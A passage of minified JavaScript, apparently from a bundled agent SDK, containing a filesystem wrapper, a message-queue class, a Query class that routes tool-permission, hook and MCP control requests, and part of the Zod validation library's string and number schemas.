X9(`readdirSync(${X})`,()=>J0.readdirSync(X,{withFileTypes:!0}))},readdirStringSync(X){return X9(`readdirStringSync(${X})`,()=>J0.readdirSync(X))},isDirEmptySync(X){return X9(`isDirEmptySync(${X})`,()=>{return this.readdirSync(X).length===0})},rmdirSync(X){return X9(`rmdirSync(${X})`,()=>J0.rmdirSync(X))},rmSync(X,Q){return X9(`rmSync(${X})`,()=>J0.rmSync(X,Q))},createWriteStream(X){return J0.createWriteStream(X)}},xp1=vp1;E5=class E5 extends Error{};qw=class qw{returned;queue=[];readResolve;readReject;isDone=!1;hasError;started=!1;constructor(X){this.returned=X}[Symbol.asyncIterator](){if(this.started)throw Error("Stream can only be iterated once");return this.started=!0,this}next(){if(this.queue.length>0)return Promise.resolve({done:!1,value:this.queue.shift()});if(this.isDone)return Promise.resolve({done:!0,value:void 0});if(this.hasError)return Promise.reject(this.hasError);return new Promise((X,Q)=>{this.readResolve=X,this.readReject=Q})}enqueue(X){if(this.readResolve){let Q=this.readResolve;this.readResolve=void 0,this.readReject=void 0,Q({done:!1,value:X})}else this.queue.push(X)}done(){if(this.isDone=!0,this.readResolve){let X=this.readResolve;this.readResolve=void 0,this.readReject=void 0,X({done:!0,value:void 0})}}error(X){if(this.hasError=X,this.readReject){let Q=this.readReject;this.readResolve=void 0,this.readReject=void 0,Q(X)}}return(){if(this.isDone=!0,this.returned)this.returned();return Promise.resolve({done:!0,value:void 0})}};Mw=class Mw{transport;isSingleUserTurn;canUseTool;hooks;abortController;jsonSchema;initConfig;pendingControlResponses=new Map;cleanupPerformed=!1;sdkMessages;inputStream=new qw;initialization;cancelControllers=new Map;hookCallbacks=new Map;nextCallbackId=0;sdkMcpTransports=new Map;sdkMcpServerInstances=new Map;pendingMcpResponses=new Map;firstResultReceivedResolve;firstResultReceived=!1;hasBidirectionalNeeds(){return this.sdkMcpTransports.size>0||this.hooks!==void 0&&Object.keys(this.hooks).length>0||this.canUseTool!==void 0}constructor(X,Q,J,Y,W,G=new Map,H,$){this.transport=X,this.isSingleUserTurn=Q,this.canUseTool=J,this.hooks=Y,this.abortController=W,this.jsonSchema=H,this.initConfig=$;for(let[z,U]of G)this.connectSdkMcpServer(z,U);this.sdkMessages=this.readSdkMessages(),this.readMessages(),this.initialization=this.initialize(),this.initialization.catch(()=>{})}setError(X){this.inputStream.error(X)}cleanup(X){if(this.cleanupPerformed)return;this.cleanupPerformed=!0;try{this.transport.close(),this.pendingControlResponses.clear(),this.pendingMcpResponses.clear(),this.cancelControllers.clear(),this.hookCallbacks.clear();for(let Q of this.sdkMcpTransports.values())try{Q.close()}catch{}if(this.sdkMcpTransports.clear(),X)this.inputStream.error(X);else this.inputStream.done()}catch(Q){}}next(...[X]){return this.sdkMessages.next(...[X])}return(X){return this.sdkMessages.return(X)}throw(X){return this.sdkMessages.throw(X)}[Symbol.asyncIterator](){return this.sdkMessages}[Symbol.asyncDispose](){return this.sdkMessages[Symbol.asyncDispose]()}async readMessages(){try{for await(let X of this.transport.readMessages()){if(X.type==="control_response"){let Q=this.pendingControlResponses.get(X.response.request_id);if(Q)Q(X.response);continue}else if(X.type==="control_request"){this.handleControlRequest(X);continue}else if(X.type==="control_cancel_request"){this.handleControlCancelRequest(X);continue}else if(X.type==="keep_alive")continue;if(X.type==="result"){if(this.firstResultReceived=!0,this.firstResultReceivedResolve)this.firstResultReceivedResolve();if(this.isSingleUserTurn)b8("[Query.readMessages] First result received for single-turn query, closing stdin"),this.transport.endInput()}this.inputStream.enqueue(X)}if(this.firstResultReceivedResolve)this.firstResultReceivedResolve();this.inputStream.done(),this.cleanup()}catch(X){if(this.firstResultReceivedResolve)this.firstResultReceivedResolve();this.inputStream.error(X),this.cleanup(X)}}async handleControlRequest(X){let Q=new AbortController;this.cancelControllers.set(X.request_id,Q);try{let J=await this.processControlRequest(X,Q.signal),Y={type:"control_response",response:{subtype:"success",request_id:X.request_id,response:J}};await Promise.resolve(this.transport.write(J8(Y)+`
`))}catch(J){let Y={type:"control_response",response:{subtype:"error",request_id:X.request_id,error:J.message||String(J)}};await Promise.resolve(this.transport.write(J8(Y)+`
`))}finally{this.cancelControllers.delete(X.request_id)}}handleControlCancelRequest(X){let Q=this.cancelControllers.get(X.request_id);if(Q)Q.abort(),this.cancelControllers.delete(X.request_id)}async processControlRequest(X,Q){if(X.request.subtype==="can_use_tool"){if(!this.canUseTool)throw Error("canUseTool callback is not provided.");return{...await this.canUseTool(X.request.tool_name,X.request.input,{signal:Q,suggestions:X.request.permission_suggestions,blockedPath:X.request.blocked_path,decisionReason:X.request.decision_reason,toolUseID:X.request.tool_use_id,agentID:X.request.agent_id}),toolUseID:X.request.tool_use_id}}else if(X.request.subtype==="hook_callback")return await this.handleHookCallbacks(X.request.callback_id,X.request.input,X.request.tool_use_id,Q);else if(X.request.subtype==="mcp_message"){let J=X.request,Y=this.sdkMcpTransports.get(J.server_name);if(!Y)throw Error(`SDK MCP server not found: ${J.server_name}`);if("method"in J.message&&"id"in J.message&&J.message.id!==null)return{mcp_response:await this.handleMcpControlRequest(J.server_name,J,Y)};else{if(Y.onmessage)Y.onmessage(J.message);return{mcp_response:{jsonrpc:"2.0",result:{},id:0}}}}throw Error("Unsupported control request subtype: "+X.request.subtype)}async*readSdkMessages(){for await(let X of this.inputStream)yield X}async initialize(){let X;if(this.hooks){X={};for(let[W,G]of Object.entries(this.hooks))if(G.length>0)X[W]=G.map((H)=>{let $=[];for(let z of H.hooks){let U=`hook_${this.nextCallbackId++}`;this.hookCallbacks.set(U,z),$.push(U)}return{matcher:H.matcher,hookCallbackIds:$,timeout:H.timeout}})}let Q=this.sdkMcpTransports.size>0?Array.from(this.sdkMcpTransports.keys()):void 0,J={subtype:"initialize",hooks:X,sdkMcpServers:Q,jsonSchema:this.jsonSchema,systemPrompt:this.initConfig?.systemPrompt,appendSystemPrompt:this.initConfig?.appendSystemPrompt,agents:this.initConfig?.agents};return(await this.request(J)).response}async interrupt(){await this.request({subtype:"interrupt"})}async setPermissionMode(X){await this.request({subtype:"set_permission_mode",mode:X})}async setModel(X){await this.request({subtype:"set_model",model:X})}async setMaxThinkingTokens(X){await this.request({subtype:"set_max_thinking_tokens",max_thinking_tokens:X})}async rewindFiles(X,Q){return(await this.request({subtype:"rewind_files",user_message_id:X,dry_run:Q?.dryRun})).response}async processPendingPermissionRequests(X){for(let Q of X)if(Q.request.subtype==="can_use_tool")this.handleControlRequest(Q).catch(()=>{})}request(X){let Q=Math.random().toString(36).substring(2,15),J={request_id:Q,type:"control_request",request:X};return new Promise((Y,W)=>{this.pendingControlResponses.set(Q,(G)=>{if(G.subtype==="success")Y(G);else if(W(Error(G.error)),G.pending_permission_requests)this.processPendingPermissionRequests(G.pending_permission_requests)}),Promise.resolve(this.transport.write(J8(J)+`
`))})}async supportedCommands(){return(await this.initialization).commands}async supportedModels(){return(await this.initialization).models}async mcpServerStatus(){return(await this.request({subtype:"mcp_status"})).response.mcpServers}async setMcpServers(X){let Q={},J={};for(let[$,z]of Object.entries(X))if(z.type==="sdk"&&"instance"in z)Q[$]=z.instance;else J[$]=z;let Y=new Set(this.sdkMcpServerInstances.keys()),W=new Set(Object.keys(Q));for(let $ of Y)if(!W.has($))await this.disconnectSdkMcpServer($);for(let[$,z]of Object.entries(Q))if(!Y.has($))this.connectSdkMcpServer($,z);let G={};for(let $ of Object.keys(Q))G[$]={type:"sdk",name:$};return(await this.request({subtype:"mcp_set_servers",servers:{...J,...G}})).response}async accountInfo(){return(await this.initialization).account}async streamInput(X){b8("[Query.streamInput] Starting to process input stream");try{let Q=0;for await(let J of X){if(Q++,b8(`[Query.streamInput] Processing message ${Q}: ${J.type}`),this.abortController?.signal.aborted)break;await Promise.resolve(this.transport.write(J8(J)+`
`))}if(b8(`[Query.streamInput] Finished processing ${Q} messages from input stream`),Q>0&&this.hasBidirectionalNeeds())b8("[Query.streamInput] Has bidirectional needs, waiting for first result"),await this.waitForFirstResult();b8("[Query] Calling transport.endInput() to close stdin to CLI process"),this.transport.endInput()}catch(Q){if(!(Q instanceof E5))throw Q}}waitForFirstResult(){if(this.firstResultReceived)return b8("[Query.waitForFirstResult] Result already received, returning immediately"),Promise.resolve();return new Promise((X)=>{if(this.abortController?.signal.aborted){X();return}this.abortController?.signal.addEventListener("abort",()=>X(),{once:!0}),this.firstResultReceivedResolve=X})}handleHookCallbacks(X,Q,J,Y){let W=this.hookCallbacks.get(X);if(!W)throw Error(`No hook callback found for ID: ${X}`);return W(Q,J,{signal:Y})}connectSdkMcpServer(X,Q){let J=new Zw((Y)=>this.sendMcpServerMessageToCli(X,Y));this.sdkMcpTransports.set(X,J),this.sdkMcpServerInstances.set(X,Q),Q.connect(J)}async disconnectSdkMcpServer(X){let Q=this.sdkMcpTransports.get(X);if(Q)await Q.close(),this.sdkMcpTransports.delete(X);this.sdkMcpServerInstances.delete(X)}sendMcpServerMessageToCli(X,Q){if("id"in Q&&Q.id!==null&&Q.id!==void 0){let Y=`${X}:${Q.id}`,W=this.pendingMcpResponses.get(Y);if(W){W.resolve(Q),this.pendingMcpResponses.delete(Y);return}}let J={type:"control_request",request_id:lp1(),request:{subtype:"mcp_message",server_name:X,message:Q}};this.transport.write(J8(J)+`
`)}handleMcpControlRequest(X,Q,J){let Y="id"in Q.message?Q.message.id:null,W=`${X}:${Y}`;return new Promise((G,H)=>{let $=()=>{this.pendingMcpResponses.delete(W)},z=(K)=>{$(),G(K)},U=(K)=>{$(),H(K)};if(this.pendingMcpResponses.set(W,{resolve:z,reject:U}),J.onmessage)J.onmessage(Q.message);else{$(),H(Error("No message handler registered"));return}})}};(function(X){X.assertEqual=(W)=>{};function Q(W){}X.assertIs=Q;function J(W){throw Error()}X.assertNever=J,X.arrayToEnum=(W)=>{let G={};for(let H of W)G[H]=H;return G},X.getValidEnumValues=(W)=>{let G=X.objectKeys(W).filter(($)=>typeof W[W[$]]!=="number"),H={};for(let $ of G)H[$]=W[$];return X.objectValues(H)},X.objectValues=(W)=>{return X.objectKeys(W).map(function(G){return W[G]})},X.objectKeys=typeof Object.keys==="function"?(W)=>Object.keys(W):(W)=>{let G=[];for(let H in W)if(Object.prototype.hasOwnProperty.call(W,H))G.push(H);return G},X.find=(W,G)=>{for(let H of W)if(G(H))return H;return},X.isInteger=typeof Number.isInteger==="function"?(W)=>Number.isInteger(W):(W)=>typeof W==="number"&&Number.isFinite(W)&&Math.floor(W)===W;function Y(W,G=" | "){return W.map((H)=>typeof H==="string"?`'${H}'`:H).join(G)}X.joinValues=Y,X.jsonStringifyReplacer=(W,G)=>{if(typeof G==="bigint")return G.toString();return G}})(R0||(R0={}));(function(X){X.mergeShapes=(Q,J)=>{return{...Q,...J}}})(AN||(AN={}));T1=R0.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),q1=R0.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]);K6=class K6 extends Error{get errors(){return this.issues}constructor(X){super();this.issues=[],this.addIssue=(J)=>{this.issues=[...this.issues,J]},this.addIssues=(J=[])=>{this.issues=[...this.issues,...J]};let Q=new.target.prototype;if(Object.setPrototypeOf)Object.setPrototypeOf(this,Q);else this.__proto__=Q;this.name="ZodError",this.issues=X}format(X){let Q=X||function(W){return W.message},J={_errors:[]},Y=(W)=>{for(let G of W.issues)if(G.code==="invalid_union")G.unionErrors.map(Y);else if(G.code==="invalid_return_type")Y(G.returnTypeError);else if(G.code==="invalid_arguments")Y(G.argumentsError);else if(G.path.length===0)J._errors.push(Q(G));else{let H=J,$=0;while($<G.path.length){let z=G.path[$];if($!==G.path.length-1)H[z]=H[z]||{_errors:[]};else H[z]=H[z]||{_errors:[]},H[z]._errors.push(Q(G));H=H[z],$++}}};return Y(this),J}static assert(X){if(!(X instanceof K6))throw Error(`Not a ZodError: ${X}`)}toString(){return this.message}get message(){return JSON.stringify(this.issues,R0.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(X=(Q)=>Q.message){let Q={},J=[];for(let Y of this.issues)if(Y.path.length>0){let W=Y.path[0];Q[W]=Q[W]||[],Q[W].push(X(Y))}else J.push(X(Y));return{formErrors:J,fieldErrors:Q}}get formErrors(){return this.flatten()}};K6.create=(X)=>{return new K6(X)};NQ=pp1,dp1=NQ;X0=Object.freeze({status:"aborted"});(function(X){X.errToObj=(Q)=>typeof Q==="string"?{message:Q}:Q||{},X.toString=(Q)=>typeof Q==="string"?Q:Q?.message})(f1||(f1={}));ip1=/^c[^\s-]{8,}$/i,rp1=/^[0-9a-z]+$/,np1=/^[0-9A-HJKMNP-TV-Z]{26}$/i,ap1=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,op1=/^[a-z0-9_-]{21}$/i,sp1=/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/,tp1=/^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/,ep1=/^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,Qd1=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,Jd1=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/,Yd1=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/,Wd1=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,Gd1=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,Hd1=/^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/,$d1=new RegExp(`^${jw}$`);x8=class x8 extends B0{_parse(X){if(this._def.coerce)X.data=String(X.data);if(this._getType(X)!==T1.string){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_type,expected:T1.string,received:W.parsedType}),X0}let J=new _9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.length<W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),J.dirty()}else if(W.kind==="max"){if(X.data.length>W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),J.dirty()}else if(W.kind==="length"){let G=X.data.length>W.value,H=X.data.length<W.value;if(G||H){if(Y=this._getOrReturnCtx(X,Y),G)C1(Y,{code:q1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});else if(H)C1(Y,{code:q1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});J.dirty()}}else if(W.kind==="email"){if(!ep1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"email",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="emoji"){if(!cU)cU=new RegExp(Xd1,"u");if(!cU.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"emoji",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="uuid"){if(!ap1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"uuid",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="nanoid"){if(!op1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"nanoid",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="cuid"){if(!ip1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"cuid",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="cuid2"){if(!rp1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"cuid2",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="ulid"){if(!np1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"ulid",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="url")try{new URL(X.data)}catch{Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"url",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="regex"){if(W.regex.lastIndex=0,!W.regex.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"regex",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="trim")X.data=X.data.trim();else if(W.kind==="includes"){if(!X.data.includes(W.value,W.position))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:{includes:W.value,position:W.position},message:W.message}),J.dirty()}else if(W.kind==="toLowerCase")X.data=X.data.toLowerCase();else if(W.kind==="toUpperCase")X.data=X.data.toUpperCase();else if(W.kind==="startsWith"){if(!X.data.startsWith(W.value))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:{startsWith:W.value},message:W.message}),J.dirty()}else if(W.kind==="endsWith"){if(!X.data.endsWith(W.value))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:{endsWith:W.value},message:W.message}),J.dirty()}else if(W.kind==="datetime"){if(!Ud1(W).test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:"datetime",message:W.message}),J.dirty()}else if(W.kind==="date"){if(!$d1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:"date",message:W.message}),J.dirty()}else if(W.kind==="time"){if(!zd1(W).test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:"time",message:W.message}),J.dirty()}else if(W.kind==="duration"){if(!tp1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"duration",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="ip"){if(!Kd1(X.data,W.version))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"ip",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="jwt"){if(!Vd1(X.data,W.alg))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"jwt",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="cidr"){if(!Bd1(X.data,W.version))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"cidr",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="base64"){if(!Gd1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"base64",code:q1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="base64url"){if(!Hd1.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"base64url",code:q1.invalid_string,message:W.message}),J.dirty()}else R0.assertNever(W);return{status:J.value,value:X.data}}_regex(X,Q,J){return this.refinement((Y)=>X.test(Y),{validation:Q,code:q1.invalid_string,...f1.errToObj(J)})}_addCheck(X){return new x8({...this._def,checks:[...this._def.checks,X]})}email(X){return this._addCheck({kind:"email",...f1.errToObj(X)})}url(X){return this._addCheck({kind:"url",...f1.errToObj(X)})}emoji(X){return this._addCheck({kind:"emoji",...f1.errToObj(X)})}uuid(X){return this._addCheck({kind:"uuid",...f1.errToObj(X)})}nanoid(X){return this._addCheck({kind:"nanoid",...f1.errToObj(X)})}cuid(X){return this._addCheck({kind:"cuid",...f1.errToObj(X)})}cuid2(X){return this._addCheck({kind:"cuid2",...f1.errToObj(X)})}ulid(X){return this._addCheck({kind:"ulid",...f1.errToObj(X)})}base64(X){return this._addCheck({kind:"base64",...f1.errToObj(X)})}base64url(X){return this._addCheck({kind:"base64url",...f1.errToObj(X)})}jwt(X){return this._addCheck({kind:"jwt",...f1.errToObj(X)})}ip(X){return this._addCheck({kind:"ip",...f1.errToObj(X)})}cidr(X){return this._addCheck({kind:"cidr",...f1.errToObj(X)})}datetime(X){if(typeof X==="string")return this._addCheck({kind:"datetime",precision:null,offset:!1,local:!1,message:X});return this._addCheck({kind:"datetime",precision:typeof X?.precision>"u"?null:X?.precision,offset:X?.offset??!1,local:X?.local??!1,...f1.errToObj(X?.message)})}date(X){return this._addCheck({kind:"date",message:X})}time(X){if(typeof X==="string")return this._addCheck({kind:"time",precision:null,message:X});return this._addCheck({kind:"time",precision:typeof X?.precision>"u"?null:X?.precision,...f1.errToObj(X?.message)})}duration(X){return this._addCheck({kind:"duration",...f1.errToObj(X)})}regex(X,Q){return this._addCheck({kind:"regex",regex:X,...f1.errToObj(Q)})}includes(X,Q){return this._addCheck({kind:"includes",value:X,position:Q?.position,...f1.errToObj(Q?.message)})}startsWith(X,Q){return this._addCheck({kind:"startsWith",value:X,...f1.errToObj(Q)})}endsWith(X,Q){return this._addCheck({kind:"endsWith",value:X,...f1.errToObj(Q)})}min(X,Q){return this._addCheck({kind:"min",value:X,...f1.errToObj(Q)})}max(X,Q){return this._addCheck({kind:"max",value:X,...f1.errToObj(Q)})}length(X,Q){return this._addCheck({kind:"length",value:X,...f1.errToObj(Q)})}nonempty(X){return this.min(1,f1.errToObj(X))}trim(){return new x8({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new x8({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new x8({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find((X)=>X.kind==="datetime")}get isDate(){return!!this._def.checks.find((X)=>X.kind==="date")}get isTime(){return!!this._def.checks.find((X)=>X.kind==="time")}get isDuration(){return!!this._def.checks.find((X)=>X.kind==="duration")}get isEmail(){return!!this._def.checks.find((X)=>X.kind==="email")}get isURL(){return!!this._def.checks.find((X)=>X.kind==="url")}get isEmoji(){return!!this._def.checks.find((X)=>X.kind==="emoji")}get isUUID(){return!!this._def.checks.find((X)=>X.kind==="uuid")}get isNANOID(){return!!this._def.checks.find((X)=>X.kind==="nanoid")}get isCUID(){return!!this._def.checks.find((X)=>X.kind==="cuid")}get isCUID2(){return!!this._def.checks.find((X)=>X.kind==="cuid2")}get isULID(){return!!this._def.checks.find((X)=>X.kind==="ulid")}get isIP(){return!!this._def.checks.find((X)=>X.kind==="ip")}get isCIDR(){return!!this._def.checks.find((X)=>X.kind==="cidr")}get isBase64(){return!!this._def.checks.find((X)=>X.kind==="base64")}get isBase64url(){return!!this._def.checks.find((X)=>X.kind==="base64url")}get minLength(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X}get maxLength(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X}};x8.create=(X)=>{return new x8({checks:[],typeName:Q0.ZodString,coerce:X?.coerce??!1,...H0(X)})};k5=class k5 extends B0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(X){if(this._def.coerce)X.data=Number(X.data);if(this._getType(X)!==T1.number){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_type,expected:T1.number,received:W.parsedType}),X0}let J=void 0,Y=new _9;for(let W of this._def.checks)if(W.kind==="int"){if(!R0.isInteger(X.data))J=this._getOrReturnCtx(X,J),C1(J,{code:q1.invalid_type,expected:"integer",received:"float",message:W.message}),Y.dirty()}else if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)J=this._getOrReturnCtx(X,J),C1(J,{code:q1.too_small,minimum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)J=this._getOrReturnCtx(X,J),C1(J,{code:q1.too_big,maximum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(qd1(X.data,W.value)!==0)J=this._getOrReturnCtx(X,J),C1(J,{code:q1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else if(W.kind==="finite"){if(!Number.isFinite(X.data))J=this._getOrReturnCtx(X,J),C1(J,{code:q1.not_finite,message:W.message}),Y.dirty()}else R0.assertNever(W);return{status:Y.value,value:X.data}}gte(X,Q){return this.setLimit("min",X,!0,f1.toString(Q))}gt(X,Q){return this.setLimit("min",X,!1,f1.toString(Q))}lte(X,Q){return this.setLimit("max",X,!0,f1.toString(Q))}lt(X,Q){return this.setLimit("max",X,!1,f1.toString(Q))}setLimit(X,Q,J,Y){return new k5({...this._def,checks:[...this._def.checks,{kind:X,value:Q,inclusive:J,message:f1.toString(Y)}]})}_addCheck(X){return new k5({...this._def,checks:[...this._def.checks,X]})}int(X){return this._addCheck({kind:"int",message:f1.toString(X)})}positive(X){return this._addCheck({kind:"min",value:0,inclusive:!1,message:f1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:0,inclusive:!1,message:f1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:0,inclusive:!0,message:f1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:0,inclusive:!0,message:f1.toString(X)})}multipleOf(X,Q){return this._addCheck({kind:"multipleOf",value:X,message:f1.toString(Q)})}finite(X){return this._addCheck({kind:"finite",message:f1.toString(X)})}safe(X){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:f1.toString(X)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:f1.toString(X)})}get minValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X}get maxValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X}get isInt(){return!!this._def.checks.find((X)=>X.kind==="int"||X.kind==="multipleOf"&&R0.isInteger(X.value))}get isFinite(){let X=null,Q=null;for(let J of this._def.checks)if(J.kind==="finite"||J.kind==="int"||J.kind==="multipleOf")return!0;else if(J.kind==="min"){if(Q===null||J.value>Q)Q=J.value}else if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return Number.isFinite(Q)&&Number.isFinite(X)}};k5.create=(X)=>{return new k5({checks:[],typeName:Q0.ZodNumber,coerce:X?.coerce||!1,...H0(X)})};b5=class b5 extends 